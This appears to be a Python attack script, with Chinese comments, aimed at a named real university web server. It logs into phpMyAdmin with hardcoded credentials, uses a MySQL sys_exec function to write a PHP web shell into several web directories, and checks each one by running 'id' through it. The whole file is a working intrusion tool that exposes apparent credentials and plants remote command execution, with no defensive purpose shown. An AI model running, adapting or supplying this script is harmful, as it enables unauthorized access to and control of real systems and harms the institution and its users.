#!/usr/bin/env python3
import requests
import re
import urllib3
import time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th/phpmyadmin/"
session = requests.Session()
session.verify = False

login_data = {"pma_username": "mysql", "pma_password": "Mu123.123.", "server": "1"}
resp = session.post(url + "index.php", data=login_data, allow_redirects=True)
token = re.search(r'token=([a-f0-9]+)', resp.text).group(1)

print(f"[+] Token: {token}")
print("[*] 尝试写入shell文件到web目录...")

# 使用sys_exec写入shell
shell_code = "<?php system($_GET['c']); ?>"
web_paths = [
    "/var/www/html/enmeeting/shell.php",
    "/var/www/html/shell.php",
    "/var/www/html/enmeeting/s.php",
    "/var/www/html/enmeeting/c.php",
]

for web_path in web_paths:
    # 使用printf避免引号问题
    cmd = f"printf '{shell_code}' > {web_path}"
    sql = f"SELECT sys_exec('{cmd}');"
    sql_data = {"sql_query": sql, "db": "mysql"}
    resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)
    
    time.sleep(1)
    http_path = web_path.replace("/var/www/html", "")
    test_url = f"https://olympic.su.ac.th{http_path}?c=id"
    test_resp = requests.get(test_url, verify=False, timeout=5)
    if "uid=" in test_resp.text:
        print(f"[+] Shell获取成功: {test_url}")
        exit(0)

print("[-] 文件写入失败，尝试其他方法...")
